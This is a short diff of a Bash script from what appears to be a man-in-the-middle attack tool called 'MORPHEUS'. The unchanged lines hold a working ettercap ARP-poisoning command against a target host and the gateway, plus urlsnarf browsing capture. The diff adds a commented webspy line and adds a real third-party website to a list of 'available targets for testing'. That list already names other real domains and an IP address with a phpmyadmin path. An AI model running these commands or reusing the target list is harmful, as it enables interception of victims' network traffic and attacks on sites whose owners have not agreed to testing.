@@ -1109,7 +1109,7 @@ UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target
       echo ${BlueF}[☠]${white} Please wait, Capturing traffic${RedF}!${Reset};
       sleep 2
       if [ "$IpV" = "ACTIVE" ]; then
-      echo ${RedF}
+      echo ${RedF}  # webspy -i $InT3R $UpL
         urlsnarf -i $InT3R | cut -d\" -f4 & xterm -T "MORPHEUS - browsing capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/grab_hosts.ef -M ARP /$rhost// /$gateway//"
       else
       echo ${RedF}
@@ -1355,6 +1355,7 @@ sh_stageT () {
 echo ""
 echo "${white}    Available targets For testing [HTTP] "
 echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo "${BlueF}    |  ${YellowF}http://eventolinux.org${BlueF}                                           |"
 echo "${BlueF}    |  ${YellowF}http://predragtasevski.com${BlueF}                                       |"
 echo "${BlueF}    |  ${YellowF}http://www.portugalpesca.com${BlueF}                                     |"
 echo "${BlueF}    |  ${YellowF}http://178.21.117.152/phpmyadmin/${BlueF}                                |"
